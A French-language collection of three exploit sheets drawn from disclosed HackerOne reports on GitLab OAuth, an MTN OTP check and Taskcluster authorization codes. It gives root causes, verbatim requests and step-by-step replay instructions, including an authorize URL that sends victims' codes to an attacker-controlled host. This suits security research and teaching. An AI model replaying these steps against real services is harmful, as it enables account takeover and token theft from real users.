# Fiches SSS — Auth Bypass — MFA / 2FA / OAuth / Clickjacking

*3 fiches SSS rejouables, tirées de cas réels du corpus 2025-2026.*

### Mint Oauth2 access token for targeted user (GitLab)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/1148364)

Au niveau groupe, un propriétaire de groupe peut créer une application OAuth avec le flag `trusted` (réservé aux admins d'instance) via une injection de paramètre. Une application « trustée » contourne le contrôle CSRF du flow d'autorisation : en envoyant à la victime une URL `/login/oauth/authorize?…&scope=api` (ou une balise img), l'attaquant obtient un code d'autorisation sans consentement, puis frappe un access token `api` au nom de la victime. Bounty 5580 $.

**Cause racine :** Le flag `doorkeeper_application[trusted]` est mass-assignable par un propriétaire de groupe ; une app trustée saute le contrôle CSRF du flow d'autorisation : « This bypassed the CSRF control for authorization flow. »

**Preuve technique (verbatim depuis la source) :**

```
doorkeeper_application%5Btrusted%5D=0&doorkeeper_application%5Btrusted%5D=1&
...
https://gitlab.com/login/oauth/authorize?redirect_uri=http://<attacker-control>.com&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api
...
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
...
code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
...
access_token=bc3450dfcc2fb46eece85d1f74d96070f94cd35e656b184706027227243d5338&scope=api&token_type=Bearer
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte GitLab (user1) ; la victime doit ouvrir le lien d'autorisation (ou charger l'img).
- Étapes : 1. Créer un groupe, puis Settings > Applications avec le scope `api`. 2. Intercepter « Save application » et injecter `doorkeeper_application%5Btrusted%5D=1` (application trusted par défaut). 3. Envoyer l'URL `/login/oauth/authorize?…&client_id=<app>&scope=api` à la victime ; intercepter le callback avec le `code`. 4. Échanger le code via `POST /login/oauth/access_token` (`code`+`client_id`+`client_secret`) → `access_token` scope `api` de la victime.
- Pièges / limites : non documenté dans la source (état de correction de gitlab.com non précisé).

**Reproductibilité :** moyenne — compte GitLab et interaction de la victime nécessaires ; étapes et requêtes complètes.

**Techniques :** oauth2, mass assignment, csrf bypass, trusted application abuse, authorization code interception, scope escalation

**Correspond aux classes qualifiantes :** ato, oauth misconfiguration, privilege escalation

**Signal (endpoints/fonctions observés) :**
- `POST /login/oauth/access_token` (échange de code)
- `GET /login/oauth/authorize` (`redirect_uri`, `client_id`, `scope`)
- Paramètre mass-assignable `doorkeeper_application[trusted]`

**Paramètres impliqués :** `doorkeeper_application[trusted]`, `redirect_uri`, `client_id`, `client_secret`, `code`, `scope`

---

### Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (MTN Group)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2762462)

Sur shop.mtn.ng, le flux OTP (`/mtn_otp/index/verification/`) peut être détourné : en interceptant la réponse « Invalid OTP » et en la remplaçant par un succès, le client tient l'OTP pour vérifié alors qu'il est faux. Le rapport affirme qu'un numéro non contrôlé par l'attaquant (MSISDN de la victime) se retrouve lié à son compte, ouvrant un ATO : accès au compte, modification d'infos, transactions.

**Cause racine :** Le client fait confiance à la réponse de vérification OTP sans contrôle d'intégrité : « The server does not perform integrity checks on the response sent back to the client ».

**Preuve technique (verbatim depuis la source) :**

```
POST /mtn_otp/index/verification/ HTTP/2
Host: shop.mtn.ng
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

ajax=1&action=verifyotp&msisdn=██████&otp=███████
...
"status": 400,
"message": "Invalid OTP",
...
"status": 200,
"message": "success",
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : proxy d'interception (Burp/Caido) ; un numéro cible non contrôlé (MSISDN) ; le flux login/inscription.
- Étapes : 1. Lancer login/inscription, saisir le MSISDN cible et demander un OTP. 2. Intercepter `POST /mtn_otp/index/verification/` (`ajax=1&action=verifyotp&msisdn=…&otp=…`). 3. Soumettre un code erroné, puis réécrire la réponse 400 en 200 (`"success": true`) au vol. 4. Constater que le client tient l'OTP pour vérifié et que le numéro est lié au compte (capture d'écran du rapport : « I do not own this phone number at all and as you can see it is now linked to my account »).
- Pièges / limites : la manipulation porte sur la réponse côté client — vérifier l'état côté serveur avant de conclure ; WAF/rate limit non documentés.

**Reproductibilité :** moyenne — proxy et MSISDN cible requis ; étapes complètes mais l'impact repose sur une preuve visuelle.

**Techniques :** otp bypass, response tampering, client-side trust, alternate channel, account takeover

**Correspond aux classes qualifiantes :** ato, auth bypass, mfa bypass

**Signal (endpoints/fonctions observés) :**
- `POST /mtn_otp/index/verification/` (`ajax=1&action=verifyotp`)
- Réponse JSON `status`/`success` réécrite en vol

**Paramètres impliqués :** `msisdn`, `otp`, `ajax`, `action`

---

### Taskcluster OAuth2 authorization codes are reusable and not expiry-checked (Mozilla)

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3734676)

Dans `services/web-server/src/servers/oauth2.js`, le handler d'échange OAuth2 ne consomme jamais les codes d'autorisation et vérifie la mauvaise colonne d'expiration : `entry.client_details.expires` (jusqu'à 1 an) au lieu de `entry.expires` (10 minutes). Un code capturé (referer, logs, proxy TLS, historique) est donc rejouable pour frapper un bridge token de la victime, puis des credentials Taskcluster (scopes Firefox-CI pour firefox-ci-tc). Le PoC local Mocha prouve la réutilisation : deux tokens distincts issus du même code. Bounty 2000 $.

**Cause racine :** Le code n'est pas consommé à l'échange et l'expiration à 10 minutes n'est jamais contrôlée (mismatch de colonne), violant RFC 6749 §4.1.2.

**Preuve technique (verbatim depuis la source) :**

```
it never deletes or otherwise consumes the `authorization_codes` row.
...
"The client MUST NOT use the authorization code more than once. If an authorization code is used more than once, the authorization server MUST deny the request..."
...
$ TEST_DB_URL=postgresql://postgres@localhost:5432/taskcluster-test NODE_ENV=test \
    yarn mocha --grep "TC-002" test/third_party_test.js
...
    ✔ TC-002 (PoC): authorization code is reusable in violation of RFC 6749 §4.1.2
...
DELETE FROM authorization_codes
 WHERE code = code_in
   AND client_id = client_id_in
   AND redirect_uri = redirect_uri_in
   AND expires > now()
 RETURNING code, client_id, redirect_uri, identity, identity_provider_id, expires, client_details;
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : code d'autorisation capturé (referer, logs, proxy TLS, historique navigateur) ; PoC local : Taskcluster au commit indiqué, `yarn install`, Postgres via docker compose.
- Étapes : 1. `GET /login/oauth/authorize` avec le client `test-code-whitelisted`, récupérer le code. 2. Échanger via `POST /login/oauth/token` → token A. 3. Rejouer le même code → token B (≠ A). 4. `GET /login/oauth/credentials` avec `Authorization: Bearer <token B>` → credentials Taskcluster au nom de l'utilisateur d'origine.
- Pièges / limites : capture du code soumise à des conditions rares ; fenêtre bornée par `client_details.expires` et le cron `cleanup-expire-auth-codes`.

**Reproductibilité :** moyenne — PoC local complet fourni, mais stack lourde (Taskcluster + Postgres) et cible réelle via capture de code.

**Techniques :** oauth2, authorization code replay, expiry mismatch, capture-replay, rfc 6749 violation, token minting

**Correspond aux classes qualifiantes :** auth bypass, oauth misconfiguration, session replay

**Signal (endpoints/fonctions observés) :**
- `POST /login/oauth/token` (code non consommé)
- `GET /login/oauth/credentials` (vérifie `entry.client_details.expires` à tort)
- `services/web-server/src/servers/oauth2.js` lignes 165-199 et 318-375

**Paramètres impliqués :** `code`, `client_id`, `redirect_uri`, `Authorization: Bearer`
